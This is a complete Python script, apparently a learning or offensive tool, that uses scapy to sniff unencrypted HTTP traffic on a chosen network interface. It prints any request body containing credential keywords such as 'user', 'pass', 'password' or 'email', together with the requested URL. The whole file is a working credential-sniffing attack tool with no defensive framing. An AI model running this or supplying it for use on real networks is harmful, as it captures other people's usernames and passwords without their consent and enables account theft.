#!/usr/bin/python3

import sys, argparse, cgi
import scapy.all as scapy
from scapy_http import http

WORDS = ["user", "usr", "username", "pass", "pwd", "password", "email", "mail"]

def sniffer(packet):
    if packet.haslayer(http.HTTPRequest):
        req = packet[http.HTTPRequest]
        url = str(req.Host.decode()) + str(req.Path.decode())
        
        if packet.haslayer(scapy.Raw):
            payload = str(packet[scapy.Raw].load.decode())

            for w in WORDS:
                if w in payload.lower():
                    print("Got credentials at: %s\n%s" % (url, payload))
                    break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", help="The interface you want to sniff.", default="eth0", type=str, required=False)
    args = parser.parse_args()

    interface = args.i

    try:
        print("Sniffing HTTP traffic...")
        scapy.sniff(iface=interface, store=False, prn=sniffer)
    except KeyboardInterrupt:
        print("Interrupted")
        sys.exit(1)

if __name__ == "__main__":
    main()
